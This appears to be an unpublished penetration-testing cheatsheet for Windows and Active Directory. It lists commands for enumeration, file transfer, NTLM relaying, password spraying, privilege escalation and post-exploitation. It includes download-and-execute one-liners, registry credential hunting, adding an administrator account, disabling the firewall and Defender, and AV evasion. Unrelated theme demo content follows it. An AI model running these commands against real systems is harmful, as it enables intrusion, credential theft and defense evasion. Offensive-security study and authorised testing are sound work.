---
title: Windows Notes / Cheatsheet
published: false
---

# [](#header-1)Windows Notes / Cheatsheet

A place for me to store my notes/tricks for Windows Based Systems

## [](#header-2)Enumeration



Basic's

```
net users
net users /domain
net localgroup
net groups /domain
net groups /domain "Domain Admins"

Get-ADUser
Get-DomainUser
Get-DomainGroup
Get-Domain
netdiscover -r subnet/24
```



Users with SPN

```
Get-DomainUser -SPN

Get-ADComputer -filter {ServicePrincipalName -like <keyword>} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,
PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation
```



Kerberos Enumeration

```
nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
```



Active Directory

```
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName

# current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u

# Forest information
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
# Domain information
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()


Shout out to XTC (vulndev.io) for the above trick.
```



SMB Enumeration

```
nmap -p 139,445 --script smb.nse,smb-enum-shares,smbls
enum4linux 1.3.3.7
smbmap -H 1.3.3.7
smbclient -L \\INSERTIPADDRESS
smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john
smbclient //INSERTIPADDRESS/admin$ -U john
nbtscan [SUBNET]
```



SNMP Enumeration

```
snmpwalk -c public -v1 10.10.14.14
snmpcheck -t 10.10.14.14 -c public
onesixtyone -c names -i hosts
nmap -sT -p 161 10.10.14.14 -oG snmp_results.txt
snmpenum -t 10.10.14.14
```



MySQL Enumeration

```
nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
```



DNS Zone Transfer

```
dig axfr blah.com @ns1.m0chan.com
nslookup -> set type=any -> ls -d m0chan.com
dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
```





RPC Enumeration

```
rpcclient -U "10.10.14.14"
```

Remote Desktop

```
rdesktop -u guest -p guest INSERTIPADDRESS -g 94%

# Brute force
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
```



## [](#header-2)File Transfer



TFTP

```
m0chan Machine

mkdir tftp

atftpd --deamon --port 69 tftp

cp *file* tftp

On victim machine:

tftp -i <[IP]> GET <[FILE]>
```



FTP

```
echo open <[IP]> 21 > ftp.txt

echo USER demo >> ftp.txt

echo ftp >> ftp.txt

echo bin >> ftp.txt

echo GET nc.exe >> ftp.txt

echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
```



Powershell

```
Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"

(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 

#Powershell Download to Memory

IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')

#Powershell with Proxy

$browser = New-Object System.Net.WebClient;
$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString('https://server/script.ps1'));
```



CertUtil

```
#File Transfer

certutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename

#CertUtil Base64 Transfers

certutil.exe -encode inputFileName encodedOutputFileName
certutil.exe -decode encodedInputFileName decodedOutputFileName
```



Curl (Windows 1803+)

```
curl http://server/file -o file
curl http://server/file.bat | cmd

IEX(curl http://server/script.ps1);Invoke-Blah
```



SMB

```
python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support
```



## [](#header-2)Exploit



LLMNR / NBT-NS Spoofing

```
#Responder to Steal Creds

git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0


#Spoof / poison LLMNR / NetBIOS requests:
auxiliary/spoof/llmnr/llmnr_response
auxiliary/spoof/nbns/nbns_response

#Capture the hashes:
auxiliary/server/capture/smb
auxiliary/server/capture/http_ntlm
```



SMB Relay



NTLM-Relay



Priv Exchange

```
#https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/

Combine privxchange.py and ntlmrelayx

ntlmrelayx.py -t ldap://DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATE

python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local

```





Password Spraying



CrackMapExec



Mail Sniper

```
Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019

[*] Now spraying the OWA portal at https://m0chanAD.local/owa/

[*] SUCCESS! User:m0chan:Summer2019

Lmao, you really think I'd use the pass Summer2019?
```





## [](#header-2)Privilege Escalation

Reference: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

Run this script: https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat

Basics

```
systeminfo
wmic qfe
net users
hostname
whoami
net localgroups
echo %logonserver%
netsh firewall show state
netsh firewall show config
netstat -an
type C:\Windows\system32\drivers\etc\hosts
```



If It's AD Get Bloodhound Imported...

```
SharpHound.ps1
SharpHound.exe -> https://github.com/BloodHoundAD/SharpHound

IEX(System.Net.WebClient.DownloadString('http://webserver:4444/SharpHound.ps1'))
```



Cleartext Passwords

```
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```



View Installed Software

```
tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```



Weak Folder Permissions

```
Full Permissions for 'Everyone' on Program Folders

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 

Modify Permissions for Everyone on Program Folders

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
```



Scheduled Tasks

```
schtasks /query /fo LIST /v
```



View Connected Drives

```
net use
wmic logicaldisk get caption,description
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```



View Privs

```
whoami /priv

Look for SeImpersonate, SeDebugPrivilege etc
```



Is Anyone Else Logged In?

```
qwinsta
```



View Registry Auto-Login

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
```



View Stored Creds in Credential Manager

```
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\

Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```



View Unquoted Service Paths

```
wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```



View Startup Items

```
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```



Check for AlwaysInstalledElevated Reg Key

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```



Any Passwords in Registry?

```
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s 
```



Any Sysrep or Unattend Files Left Over

```
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul

Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```



Token Impersonation

```

```



Juicy Potato

```

```



DCSync (Also Post Exploit)

```

```



## [](#header-2)Post Exploitation



Useful Commands

```
net user m0chan /add /domain
net localgroup Administrators m0chan /add

# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Turn firewall off
netsh firewall set opmode disable

Or like this
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

If you get this error:

CredSSP Error Fix ->

Add this reg key:

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true

```



Check if Powershell Logging is Enabled

```
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
```



Dump Creds

```

```



Check for Missing KB's

```
watson.exe
Sherlock.ps1

Use Watson.exe Assembly and reflectively load .NET Assembly into memory to avoid antivirus. 

More at the bottom re. Reflectively Loading stuff. (Also does not hurt to change certain strings etc)

https://github.com/rasta-mouse/Watson
```







[](#header-2)Lateral Movement

Plink

```
plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS

#Windows 1803 Built in SSH Client (By Default)

ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
```















###### [](#header-6)Header 6

| head1        | head two          | three |
|:-------------|:------------------|:------|
| ok           | good swedish fish | nice  |
| out of stock | good and plenty   | nice  |
| ok           | good `oreos`      | hmm   |
| ok           | good `zoute` drop | yumm  |

### There's a horizontal rule below this.

* * *

### Here is an unordered list:

*   Item foo
*   Item bar
*   Item baz
*   Item zip

### And an ordered list:

1.  Item one
1.  Item two
1.  Item three
1.  Item four

### And a nested list:

- level 1 item
  - level 2 item
  - level 2 item
    - level 3 item
    - level 3 item
- level 1 item
  - level 2 item
  - level 2 item
  - level 2 item
- level 1 item
  - level 2 item
  - level 2 item
- level 1 item

### Small image

![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)

### Large image

![](https://guides.github.com/activities/hello-world/branching.png)


### Definition lists can be used with HTML syntax.

<dl>
<dt>Name</dt>
<dd>Godzilla</dd>
<dt>Born</dt>
<dd>1952</dd>
<dt>Birthplace</dt>
<dd>Japan</dd>
<dt>Color</dt>
<dd>Green</dd>
</dl>

```
Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
```

```
The final element.
```
